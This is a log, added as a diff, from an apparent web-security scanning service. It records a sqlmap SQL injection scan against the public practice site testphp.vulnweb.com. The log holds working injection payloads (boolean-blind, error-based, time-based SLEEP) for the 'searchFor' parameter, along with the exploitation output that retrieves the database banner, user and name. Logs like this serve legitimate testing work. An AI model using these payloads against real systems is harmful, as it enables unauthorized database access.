@@ -1,0 +1,119 @@
+[08:55:44] [INFO] [*] Starting QUICK SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[08:55:44] [INFO] [*] Starting QUICK scan (Detection) on http://testphp.vulnweb.com/artists.php?artist=1
+[08:55:44] [INFO] [*] Executing SQLMap...
+[08:55:53] [INFO] ___
+[08:55:53] [INFO] __H__
+[08:55:53] [INFO] ___ ___[(]_____ ___ ___  {1.10.1.12#dev}
+[08:55:53] [INFO] |_ -| . [(]     | .'| . |
+[08:55:53] [INFO] |___|_  [,]_|_|_|__,|  _|
+[08:55:53] [INFO] |_|V...       |_|   https://sqlmap.org
+[08:55:53] [INFO] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[08:55:53] [INFO] [*] starting @ 08:55:53 /2026-02-23/
+[08:55:53] [INFO] [08:55:53] [WARNING] using 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1' as the output directory
+[08:55:54] [INFO] [08:55:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[08:55:54] [INFO] [STAGE] [08:55:54] [INFO] testing connection to the target URL
+[08:55:54] [INFO] [08:55:54] [INFO] searching for forms
+[08:56:02] [INFO] [1/1] Form:
+[08:56:02] [INFO] POST http://testphp.vulnweb.com/search.php?test=query
+[08:56:02] [INFO] POST data: searchFor=&goButton=go
+[08:56:02] [INFO] do you want to test this form? [Y/n/q]
+[08:56:02] [INFO] > Y
+[08:56:02] [INFO] Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
+[08:56:02] [INFO] do you want to fill blank fields with random values? [Y/n] Y
+[08:56:02] [INFO] [08:56:02] [INFO] using 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\results-02232026_0856am.csv' as the CSV results file in multiple targets mode
+[08:56:02] [INFO] [STAGE] [08:56:02] [INFO] checking if the target is protected by some kind of WAF/IPS
+[08:56:02] [INFO] [STAGE] [08:56:02] [INFO] testing if the target URL content is stable
+[08:56:03] [INFO] [08:56:03] [INFO] target URL content is stable
+[08:56:03] [INFO] [STAGE] [08:56:03] [INFO] testing if POST parameter 'searchFor' is dynamic
+[08:56:03] [INFO] [08:56:03] [WARNING] POST parameter 'searchFor' does not appear to be dynamic
+[08:56:04] [INFO] [08:56:04] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')
+[08:56:04] [INFO] [+] [08:56:04] [INFO] heuristic (XSS) test shows that POST parameter 'searchFor' might be vulnerable to cross-site scripting (XSS) attacks
+[08:56:04] [INFO] [STAGE] [08:56:04] [INFO] testing for SQL injection on POST parameter 'searchFor'
+[08:56:04] [INFO] [+] it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[08:56:04] [INFO] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[08:56:04] [INFO] [STAGE] [08:56:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:56:04] [INFO] [08:56:04] [WARNING] reflective value(s) found and filtering out
+[08:56:09] [INFO] [STAGE] [08:56:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:56:09] [INFO] [STAGE] [08:56:09] [INFO] testing 'Generic inline queries'
+[08:56:10] [INFO] [STAGE] [08:56:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:56:25] [INFO] [STAGE] [08:56:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:56:37] [INFO] [STAGE] [08:56:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[08:56:51] [INFO] [STAGE] [08:56:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[08:57:13] [INFO] [STAGE] [08:57:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:57:40] [INFO] [STAGE] [08:57:40] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:58:01] [INFO] [STAGE] [08:58:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:58:26] [INFO] [STAGE] [08:58:26] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:58:47] [INFO] [STAGE] [08:58:47] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:58:52] [INFO] [08:58:52] [INFO] POST parameter 'searchFor' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable (with --string="Our")
+[08:58:52] [INFO] [STAGE] [08:58:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[08:58:52] [INFO] [STAGE] [08:58:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[08:58:53] [INFO] [STAGE] [08:58:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[08:58:53] [INFO] [STAGE] [08:58:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[08:58:53] [INFO] [STAGE] [08:58:53] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[08:58:53] [INFO] [STAGE] [08:58:53] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[08:58:54] [INFO] [08:58:54] [INFO] POST parameter 'searchFor' is 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' injectable
+[08:58:54] [INFO] [STAGE] [08:58:54] [INFO] testing 'MySQL inline queries'
+[08:58:54] [INFO] [STAGE] [08:58:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[08:58:54] [INFO] [STAGE] [08:58:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[08:58:55] [INFO] [STAGE] [08:58:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[08:58:55] [INFO] [STAGE] [08:58:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[08:58:55] [INFO] [STAGE] [08:58:55] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[08:58:56] [INFO] [STAGE] [08:58:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[08:58:56] [INFO] [STAGE] [08:58:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:59:17] [INFO] [08:59:17] [INFO] POST parameter 'searchFor' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[08:59:17] [INFO] [STAGE] [08:59:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:59:17] [INFO] [08:59:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[08:59:24] [INFO] [STAGE] [08:59:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[08:59:30] [INFO] [STAGE] [08:59:30] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[08:59:36] [INFO] [STAGE] [08:59:36] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[08:59:42] [INFO] [STAGE] [08:59:42] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[08:59:49] [INFO] [STAGE] [08:59:49] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[08:59:55] [INFO] [STAGE] [08:59:55] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[09:00:01] [INFO] [STAGE] [09:00:01] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[09:00:07] [INFO] [STAGE] [09:00:07] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[09:00:13] [INFO] [STAGE] [09:00:13] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[09:00:19] [INFO] [STAGE] [09:00:19] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[09:00:25] [INFO] [STAGE] POST parameter 'searchFor' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[09:00:25] [INFO] sqlmap identified the following injection point(s) with a total of 769 HTTP(s) requests:
+[09:00:25] [INFO] ---
+[09:00:25] [INFO] Parameter: searchFor (POST)
+[09:00:25] [INFO] Type: boolean-based blind
+[09:00:25] [INFO] Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+[09:00:25] [INFO] Payload: searchFor=kjnt' AND EXTRACTVALUE(2782,CASE WHEN (2782=2782) THEN 2782 ELSE 0x3A END) AND 'APjb'='APjb&goButton=go
+[09:00:25] [INFO] Type: error-based
+[09:00:25] [INFO] Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+[09:00:25] [INFO] Payload: searchFor=kjnt' OR GTID_SUBSET(CONCAT(0x71767a7071,(SELECT (ELT(8277=8277,1))),0x7178706b71),8277) AND 'FzBU'='FzBU&goButton=go
+[09:00:25] [INFO] Type: time-based blind
+[09:00:25] [INFO] Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+[09:00:25] [INFO] Payload: searchFor=kjnt' AND (SELECT 3146 FROM (SELECT(SLEEP(5)))Hkja) AND 'CRdW'='CRdW&goButton=go
+[09:00:25] [INFO] ---
+[09:00:25] [INFO] do you want to exploit this SQL injection? [Y/n] Y
+[09:00:25] [INFO] [+] [09:00:25] [INFO] the back-end DBMS is MySQL
+[09:00:25] [INFO] [DATA] [09:00:25] [INFO] fetching banner
+[09:00:26] [INFO] [DATA] [09:00:26] [INFO] retrieved: '8.0.22-0ubuntu0.20.04.2'
+[09:00:28] [INFO] web server operating system: Linux Ubuntu
+[09:00:28] [INFO] web application technology: Nginx 1.19.0, PHP 5.6.40
+[09:00:28] [INFO] [+] back-end DBMS operating system: Linux Ubuntu
+[09:00:28] [INFO] [+] back-end DBMS: MySQL >= 5.6
+[09:00:28] [INFO] banner: '8.0.22-0ubuntu0.20.04.2'
+[09:00:28] [INFO] [DATA] [09:00:28] [INFO] fetching current user
+[09:00:29] [INFO] [DATA] [09:00:29] [INFO] retrieved: 'acuart@localhost'
+[09:00:29] [INFO] current user: 'acuart@localhost'
+[09:00:29] [INFO] [DATA] [09:00:29] [INFO] fetching current database
+[09:00:29] [INFO] [DATA] [09:00:29] [INFO] retrieved: 'acuart'
+[09:00:29] [INFO] current database: 'acuart'
+[09:00:29] [INFO] [STAGE] [09:00:29] [INFO] testing if current user is DBA
+[09:00:29] [INFO] [DATA] [09:00:29] [INFO] fetching current user
+[09:00:29] [INFO] [09:00:29] [WARNING] potential permission problems detected ('command denied')
+[09:00:29] [INFO] [09:00:29] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[09:00:29] [INFO] current user is DBA: False
+[09:00:29] [INFO] [09:00:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\results-02232026_0856am.csv'
+[09:00:30] [INFO] [+] Scan finished. Processing results...
+[09:00:30] [INFO] [INFO] Found SQLMap results directory: testphp.vulnweb.com
+[09:00:30] [INFO] [INFO] Parsing log file: D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\testphp.vulnweb.com\log
+[09:00:30] [INFO] [+] Successfully parsed 3 vulnerabilities.
+[09:00:30] [INFO] [+] SQL JSON report saved to D:\NetShield\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[09:00:30] [INFO] EVENT: scan_complete | PAYLOAD: {"status": "success", "target": "http://testphp.vulnweb.com/artists.php?artist=1", "report_file": "D:\\NetShield\\NetShieldAI\\Services\\results\\DivyaViradiya_1\\sql_scanner\\sql_report.json", "vulnerability_count": 3}
+[09:00:30] [INFO] [+] SQL scan complete. Generating PDF report for http://testphp.vulnweb.com/artists.php?artist=1...
+[09:01:25] [INFO] [+] PDF report generated and updated in user dashboard
+[09:01:25] [INFO] SYSTEM_EVENT: READY_FOR_ANALYSIS:http://testphp.vulnweb.com/artists.php?artist=1
